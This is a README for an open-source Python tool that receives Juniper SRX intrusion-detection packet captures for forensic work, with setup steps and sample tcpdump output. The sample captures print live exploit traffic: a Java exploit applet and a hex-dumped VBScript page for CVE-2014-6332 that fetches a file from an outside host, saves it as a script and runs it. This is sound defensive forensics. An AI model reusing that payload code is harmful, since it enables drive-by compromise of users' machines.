# SRX PCAP Receiver
Open Source IDP PCAP receiver originally created by Oscar Ibatullin.

Used as an alternative to JSA/STRM/QRadar for collecting SRX IDP Attack Packets (PCAP) for forensic analysis/incident response.

# Installation instructions
Configure SRX to forward IDP Attack packets (pre and post) to the collector's IP address. The script listens on UDP port 2050 by default but you can change this.
```
set security idp sensor-configuration packet-log source-address 'your_source_address'
set security idp sensor-configuration packet-log host 'the_collector's_ip_address'
set security idp sensor-configuration packet-log host port 2050 
```

If using routing-instances for dataplane connectivity to the collector, you'll need to setup a next-table statement from inet.0
```
set routing-options static route 'the_collector's_ip_address' next-table 'your_instance.inet.0'
```

Enable IDP Packet logging on the IDP policy of your choosing
```
set security idp idp-policy 'your_IDP_Policy' rulebase-ips rule 'your_rule' then notification packet-log pre-attack 2
set security idp idp-policy 'your_IDP_Policy' rulebase-ips rule 'your_rule' then notification packet-log post-attack 2
set security idp idp-policy 'your_IDP_Policy' rulebase-ips rule 'your_rule' then notification packet-log post-attack-timeout 5
```

Install script dependencies on the linux collector (Python 2.7 - Ubuntu Server 16.04)

Ubuntu Packages
```
sudo apt-get install python2.7 python-pip python-dpkt
```

Python 2.7 packages
  ```
pip install twisted
  ```

# Usage instructions

Thankfully, usage is quite simple. The tool will create a directory called 'Juniper_IDP_PCAP_Storage' in the directory the script is executed from.
To execute and background the script, run:
```
$ python2.7 srx_pcap_receiver.py &
```

 When the script receives its first PCAP from the SRX, it will create the directory mentioned above.

Each signature is stored within its own subdirectory, like so:
```
admin@ubuntu16:~/Juniper_IDP_PCAP_Storage$ ls -lah
total 36K
drwxrwxr-x 2 admin admin 4.0K Jan 14 09:25 DNS:MS-FOREFRONT-RCE
drwxrwxr-x 2 admin admin 4.0K Jan 19 18:48 HTTP:MISC:CVE-2014-6332-OF
drwxrwxr-x 2 admin admin 4.0K Jan 14 08:17 HTTP:STC:HIDDEN-IFRAME-2
drwxrwxr-x 2 admin admin 4.0K Jan 14 08:17 HTTP:STC:IE:CVE-2016-3351-ID
drwxrwxr-x 2 admin admin 4.0K Jan 13 16:49 HTTP:STC:JAVA:APPLET-CLASS-FILE
drwxrwxr-x 2 admin admin 4.0K Jan 13 16:49 SHELLCODE:WIN:SHIKATAGANAI-80S
drwxrwxr-x 2 admin admin 4.0K Jan 13 16:59 SHELLCODE:X86:DWORD-ADITIVE-80S

```

Navigate to the signature you'd like to analyze

```
admin@ubuntu16:~/Juniper_IDP_PCAP_Storage$ cd HTTP\:STC\:JAVA\:APPLET-CLASS-FILE/
admin@ubuntu16:~/Juniper_IDP_PCAP_Storage/HTTP:STC:JAVA:APPLET-CLASS-FILE$ ls -lah
total 12K
-rw-rw-r-- 1 admin admin  672 Jan 13 16:49 1484344180-229-2.pcap
```

Transfer and/or analyze with your favourite packet-analysis tool (Wireshark, tcpdump, tshark, etc). 
```
admin@ubuntu16:~/Juniper_IDP_PCAP_Storage/HTTP:STC:JAVA:APPLET-CLASS-FILE$ tcpdump -r 1484344180-229-2.pcap -vv

reading from file 1484344180-229-2.pcap, link-type EN10MB (Ethernet)
-5:00:00.000000 IP (tos 0x0, ttl 51, id 59053, offset 0, flags [none], proto TCP (6), length 40)
    vhost.phx1.nearlyfreespeech.net.http > 10.1.1.10.63009: Flags [.], cksum 0x5e13 (correct), seq 3215153248, ack 4131619491, win 31461, length 0
-5:00:00.010000 IP (tos 0x0, ttl 51, id 59056, offset 0, flags [none], proto TCP (6), length 478)
    vhost.phx1.nearlyfreespeech.net.http > 10.1.1.10.63009: Flags [P.], cksum 0x0704 (correct), seq 0:438, ack 1, win 32120, length 438: HTTP, length: 438
	HTTP/1.1 200 OK
	Last-Modified: Fri, 09 Nov 2012 05:34:59 GMT
	Accept-Ranges: bytes
	Content-Length: 129
	Content-Type: text/html; charset=UTF-8
	Date: Fri, 13 Jan 2017 21:49:40 GMT
	Server: Apache
	ETag: "81-4ce094fff46c0"
	Age: 0
	Via: 1.1 vhost.phx5.nearlyfreespeech.net (squid)
	Connection: keep-alive
	
	<html><head></head><body><applet archive="java_jre17_exec.jar" code="Exploit.class" width="1" height="1"></applet></body></html>
-5:00:00.020000 IP (tos 0x0, ttl 128, id 1498, offset 0, flags [DF], proto TCP (6), length 40)
    10.1.1.10.63009 > vhost.phx1.nearlyfreespeech.net.http: Flags [.], cksum 0xde07 (correct), seq 1, ack 438, win 63802, length 0
```

If you are searching for a specific PCAP in reference to an IDP_ATTACK_LOG_EVENT that Security Director and/or your SIEM has identified, you can correlate that log to its PCAP counterpart by looking for the packet-log-id value within the syslog message (5th last field).

As an example, if I am attempting to locate the PCAP for the event below, I would look first for the directory of the signature  (HTTP:MISC:CVE-2014-6332-OF), and then identify the packet-log of interest (ls -lah | grep 460). The name of each PCAP has the packet-log-id appended to it after the epoch time. It's also possible to search for just the epoch-time listed in the syslog message as well (1484869672).
```
2017-01-19T23:47:58.570Z SRX1500-A RT_IDP - IDP_ATTACK_LOG_EVENT [junos@2636.1.1.1.2.137 epoch-time="1484869672" message-type="SIG" source-address="10.1.1.10" source-port="61478" destination-address="208.94.116.21" destination-port="80" protocol-name="TCP" service-name="SERVICE_IDP" application-name="HTTP" rule-name="3" rulebase-name="IPS" policy-name="Space-IPS-Policy" export-id="17908" repeat-count="0" action="DROP" threat-severity="HIGH" attack-name="HTTP:MISC:CVE-2014-6332-OF" nat-source-address="192.168.0.10" nat-source-port="0" nat-destination-address="0.0.0.0" nat-destination-port="0" elapsed-time="0" inbound-bytes="0" outbound-bytes="0" inbound-packets="0" outbound-packets="0" source-zone-name="Inside" source-interface-name="reth1.0" destination-zone-name="Outside" destination-interface-name="reth0.0" packet-log-id="460" alert="no" username="N/A" roles="N/A" message="-"]
```

```
admin@ubuntu16:~/Juniper_IDP_PCAP_Storage/HTTP:MISC:CVE-2014-6332-OF$ ls -lah | grep 460
-rw-rw-r-- 1 admin admin 1.9K Jan 19 18:48 1484869672-460-2.pcap
```
```
admin@ubuntu16:~/Juniper_IDP_PCAP_Storage/HTTP:MISC:CVE-2014-6332-OF$ ls -lah |grep 1484869672
-rw-rw-r-- 1 admin admin 1.9K Jan 19 18:48 1484869672-460-2.pcap
```
Or, perhaps the most straight forward way is to use find to recursively search the entire PCAP Storage directory for the specific epoch time and feed it into tcpdump in one go. In the instance below, we're looking for the following event with an Epoch time of 1486656762.
```
admin@ubuntu16:~/Juniper_IDP_PCAP_Storage$ find . -name 1486656762* | xargs -t -I file tcpdump -r file -nnvvXS

tcpdump -r ./HTTP:MISC:CVE-2014-6332-OF/1486656762-4685-2.pcap -nnvvXS 
reading from file ./HTTP:MISC:CVE-2014-6332-OF/1486656762-4685-2.pcap, link-type EN10MB (Ethernet)
-5:00:00.000000 IP (tos 0x0, ttl 51, id 12600, offset 0, flags [none], proto TCP (6), length 336)
    208.94.116.21.80 > 10.1.1.10.51137: Flags [P.], cksum 0xbfb7 (correct), seq 141640169:141640465, ack 54246441, win 32120, length 296: HTTP, length: 296
	HTTP/1.1 200 OK
	Last-Modified: Tue, 17 Mar 2015 04:56:42 GMT
	Accept-Ranges: bytes
	Content-Length: 4045
	Content-Type: text/html; charset=UTF-8
	Date: Thu, 09 Feb 2017 16:12:42 GMT
	Server: Apache
	ETag: "fcd-51174caf43e24"
	Via: 1.1 vhost.phx2.nearlyfreespeech.net:3128 (squid/2.7.STABLE7)
	
	0x0000:  4500 0150 3138 0000 3306 05f2 d05e 7415  E..P18..3....^t.
	0x0010:  0a01 010a 0050 c7c1 0871 41e9 033b bc29  .....P...qA..;.)
	0x0020:  5018 7d78 bfb7 0000 4854 5450 2f31 2e31  P.}x....HTTP/1.1
	0x0030:  2032 3030 204f 4b0d 0a4c 6173 742d 4d6f  .200.OK..Last-Mo
	0x0040:  6469 6669 6564 3a20 5475 652c 2031 3720  dified:.Tue,.17.
	0x0050:  4d61 7220 3230 3135 2030 343a 3536 3a34  Mar.2015.04:56:4
	0x0060:  3220 474d 540d 0a41 6363 6570 742d 5261  2.GMT..Accept-Ra
	0x0070:  6e67 6573 3a20 6279 7465 730d 0a43 6f6e  nges:.bytes..Con
	0x0080:  7465 6e74 2d4c 656e 6774 683a 2034 3034  tent-Length:.404
	0x0090:  350d 0a43 6f6e 7465 6e74 2d54 7970 653a  5..Content-Type:
	0x00a0:  2074 6578 742f 6874 6d6c 3b20 6368 6172  .text/html;.char
	0x00b0:  7365 743d 5554 462d 380d 0a44 6174 653a  set=UTF-8..Date:
	0x00c0:  2054 6875 2c20 3039 2046 6562 2032 3031  .Thu,.09.Feb.201
	0x00d0:  3720 3136 3a31 323a 3432 2047 4d54 0d0a  7.16:12:42.GMT..
	0x00e0:  5365 7276 6572 3a20 4170 6163 6865 0d0a  Server:.Apache..
	0x00f0:  4554 6167 3a20 2266 6364 2d35 3131 3734  ETag:."fcd-51174
	0x0100:  6361 6634 3365 3234 220d 0a56 6961 3a20  caf43e24"..Via:.
	0x0110:  312e 3120 7668 6f73 742e 7068 7832 2e6e  1.1.vhost.phx2.n
	0x0120:  6561 726c 7966 7265 6573 7065 6563 682e  earlyfreespeech.
	0x0130:  6e65 743a 3331 3238 2028 7371 7569 642f  net:3128.(squid/
	0x0140:  322e 372e 5354 4142 4c45 3729 0d0a 0d0a  2.7.STABLE7)....
-5:00:00.010000 IP (tos 0x0, ttl 51, id 12604, offset 0, flags [none], proto TCP (6), length 1500)
    208.94.116.21.80 > 10.1.1.10.51137: Flags [P.], seq 141640465:141641925, ack 54246441, win 32120, length 1460: HTTP
	0x0000:  4500 05dc 313c 0000 3306 0162 d05e 7415  E...1<..3..b.^t.
	0x0010:  0a01 010a 0050 c7c1 0871 4311 033b bc29  .....P...qC..;.)
	0x0020:  5018 7d78 7701 0000 3c21 646f 6374 7970  P.}xw...<!doctyp
	0x0030:  6520 6874 6d6c 3e0a 3c68 746d 6c3e 0a3c  e.html>.<html>.<
	0x0040:  6d65 7461 2068 7474 702d 6571 7569 763d  meta.http-equiv=
	0x0050:  2258 2d55 412d 436f 6d70 6174 6962 6c65  "X-UA-Compatible
	0x0060:  2220 636f 6e74 656e 743d 2249 453d 456d  ".content="IE=Em
	0x0070:  756c 6174 6549 4538 2220 3e0a 3c6d 6574  ulateIE8".>.<met
	0x0080:  6120 6874 7470 2d65 7175 6976 3d22 436f  a.http-equiv="Co
	0x0090:  6e74 656e 742d 5479 7065 2220 636f 6e74  ntent-Type".cont
	0x00a0:  656e 743d 2274 6578 742f 6874 6d6c 3b20  ent="text/html;.
	0x00b0:  6368 6172 7365 743d 5554 462d 3822 202f  charset=UTF-8"./
	0x00c0:  3e0a 3c62 6f64 793e 0a3c 7363 7269 7074  >.<body>.<script
	0x00d0:  206c 616e 6775 6167 653d 2256 4253 6372  .language="VBScr
	0x00e0:  6970 7422 3e0a 6675 6e63 7469 6f6e 2072  ipt">.function.r
	0x00f0:  756e 6161 6161 2829 0a4f 6e20 4572 726f  unaaaa().On.Erro
	0x0100:  7220 5265 7375 6d65 204e 6578 740a 0a73  r.Resume.Next..s
	0x0110:  6574 2078 6d6c 6874 7470 203d 2043 7265  et.xmlhttp.=.Cre
	0x0120:  6174 654f 626a 6563 7428 224d 6963 726f  ateObject("Micro
	0x0130:  736f 6674 2e58 4d4c 4854 5450 2229 0a78  soft.XMLHTTP").x
	0x0140:  6d6c 6874 7470 2e6f 7065 6e20 2247 4554  mlhttp.open."GET
	0x0150:  222c 2022 6874 7470 3a2f 2f6d 616c 7761  ",."http://malwa
	0x0160:  7265 2e77 6963 6172 2e6f 7267 2f64 6174  re.wicar.org/dat
	0x0170:  612f 6d73 3134 5f30 3634 5f6f 6c65 5f78  a/ms14_064_ole_x
	0x0180:  702e 6769 6622 2c20 4661 6c73 650a 786d  p.gif",.False.xm
	0x0190:  6c68 7474 702e 7365 6e64 0a0a 5365 7420  lhttp.send..Set.
	0x01a0:  6f62 6a46 534f 3d43 7265 6174 654f 626a  objFSO=CreateObj
	0x01b0:  6563 7428 2253 6372 6970 7469 6e67 2e46  ect("Scripting.F
	0x01c0:  696c 6553 7973 7465 6d4f 626a 6563 7422  ileSystemObject"
	0x01d0:  290a 666f 6c64 6572 203d 206f 626a 4653  ).folder.=.objFS
	0x01e0:  4f2e 4765 7453 7065 6369 616c 466f 6c64  O.GetSpecialFold
	0x01f0:  6572 2832 290a 7363 7269 7074 4e61 6d65  er(2).scriptName
	0x0200:  203d 2066 6f6c 6465 7220 2b20 225c 4875  .=.folder.+."\Hu
	0x0210:  7650 2e76 6273 220a 5365 7420 6f62 6a46  vP.vbs".Set.objF
	0x0220:  696c 6520 3d20 6f62 6a46 534f 2e43 7265  ile.=.objFSO.Cre
	0x0230:  6174 6554 6578 7446 696c 6528 7363 7269  ateTextFile(scri
	0x0240:  7074 4e61 6d65 2c54 7275 6529 0a6f 626a  ptName,True).obj
	0x0250:  4669 6c65 2e57 7269 7465 2078 6d6c 6874  File.Write.xmlht
	0x0260:  7470 2e72 6573 706f 6e73 6554 6578 740a  tp.responseText.
	0x0270:  6f62 6a46 696c 652e 436c 6f73 650a 0a73  objFile.Close..s
	0x0280:  6574 2073 6865 6c6c 3d63 7265 6174 656f  et.shell=createo
	0x0290:  626a 6563 7428 2253 6865 6c6c 2e41 7070  bject("Shell.App
	0x02a0:  6c69 6361 7469 6f6e 2229 0a73 6865 6c6c  lication").shell
	0x02b0:  2e53 6865 6c6c 4578 6563 7574 6520 2277  .ShellExecute."w
	0x02c0:  7363 7269 7074 2e65 7865 222c 2073 6372  script.exe",.scr
	0x02d0:  6970 744e 616d 652c 2022 222c 2022 6f70  iptName,."",."op
	0x02e0:  656e 222c 2030 0a0a 656e 6420 6675 6e63  en",.0..end.func
	0x02f0:  7469 6f6e 0a3c 2f73 6372 6970 743e 0a3c  tion.</script>.<
	0x0300:  7363 7269 7074 206c 616e 6775 6167 653d  script.language=
	0x0310:  2256 4253 6372 6970 7422 3e0a 0a64 696d  "VBScript">..dim
	0x0320:  2020 2061 6128 290a 6469 6d20 2020 6162  ...aa().dim...ab
	0x0330:  2829 0a64 696d 2020 2061 300a 6469 6d20  ().dim...a0.dim.
	0x0340:  2020 6131 0a64 696d 2020 2061 320a 6469  ..a1.dim...a2.di
	0x0350:  6d20 2020 6133 0a64 696d 2020 2077 696e  m...a3.dim...win
	0x0360:  3978 0a64 696d 2020 2069 6e74 5665 7273  9x.dim...intVers
	0x0370:  696f 6e0a 6469 6d20 2020 726e 6461 0a64  ion.dim...rnda.d
	0x0380:  696d 2020 2066 756e 636c 6173 730a 6469  im...funclass.di
	0x0390:  6d20 2020 6d79 6172 7261 790a 0a42 6567  m...myarray..Beg
	0x03a0:  696e 2829 0a0a 6675 6e63 7469 6f6e 2042  in()..function.B
	0x03b0:  6567 696e 2829 0a20 204f 6e20 4572 726f  egin()...On.Erro
	0x03c0:  7220 5265 7375 6d65 204e 6578 740a 2020  r.Resume.Next...
	0x03d0:  696e 666f 3d4e 6176 6967 6174 6f72 2e55  info=Navigator.U
	0x03e0:  7365 7241 6765 6e74 0a0a 2020 6966 2869  serAgent....if(i
	0x03f0:  6e73 7472 2869 6e66 6f2c 2257 696e 3634  nstr(info,"Win64
	0x0400:  2229 3e30 2920 2020 7468 656e 0a20 2020  ")>0)...then....
	0x0410:  2020 6578 6974 2020 2066 756e 6374 696f  ..exit...functio
	0x0420:  6e0a 2020 656e 6420 6966 0a0a 2020 6966  n...end.if....if
	0x0430:  2028 696e 7374 7228 696e 666f 2c22 4d53  .(instr(info,"MS
	0x0440:  4945 2229 3e30 2920 2020 7468 656e 0a20  IE")>0)...then..
	0x0450:  2020 2020 2020 2020 2020 2020 696e 7456  ............intV
	0x0460:  6572 7369 6f6e 203d 2043 496e 7428 4d69  ersion.=.CInt(Mi
	0x0470:  6428 696e 666f 2c20 496e 5374 7228 696e  d(info,.InStr(in
	0x0480:  666f 2c20 224d 5349 4522 2920 2b20 352c  fo,."MSIE").+.5,
	0x0490:  2032 2929 0a20 2065 6c73 650a 2020 2020  .2))...else.....
	0x04a0:  2065 7869 7420 2020 6675 6e63 7469 6f6e  .exit...function
	0x04b0:  0a0a 2020 656e 6420 6966 0a0a 2020 7769  ....end.if....wi
	0x04c0:  6e39 783d 300a 0a20 2042 6567 696e 496e  n9x=0....BeginIn
	0x04d0:  6974 2829 0a20 2049 6620 4372 6561 7465  it()...If.Create
	0x04e0:  2829 3d54 7275 6520 5468 656e 0a20 2020  ()=True.Then....
	0x04f0:  2020 6d79 6172 7261 793d 2020 2020 2020  ..myarray=......
	0x0500:  2020 6368 7277 2830 3129 2663 6872 7728  ..chrw(01)&chrw(
	0x0510:  3231 3736 2926 6368 7277 2830 3129 2663  2176)&chrw(01)&c
	0x0520:  6872 7728 3030 2926 6368 7277 2830 3029  hrw(00)&chrw(00)
	0x0530:  2663 6872 7728 3030 2926 6368 7277 2830  &chrw(00)&chrw(0
	0x0540:  3029 2663 6872 7728 3030 290a 2020 2020  0)&chrw(00).....
	0x0550:  206d 7961 7272 6179 3d6d 7961 7272 6179  .myarray=myarray
	0x0560:  2663 6872 7728 3030 2926 6368 7277 2833  &chrw(00)&chrw(3
	0x0570:  3237 3637 2926 6368 7277 2830 3029 2663  2767)&chrw(00)&c
	0x0580:  6872 7728 3029 0a0a 2020 2020 2069 6628  hrw(0).......if(
	0x0590:  696e 7456 6572 7369 6f6e 3c34 2920 7468  intVersion<4).th
	0x05a0:  656e 0a20 2020 2020 2020 2020 646f 6375  en..........docu
	0x05b0:  6d65 6e74 2e77 7269 7465 2822 3c62 723e  ment.write("<br>
	0x05c0:  2049 4522 290a 2020 2020 2020 2020       .IE").........
```

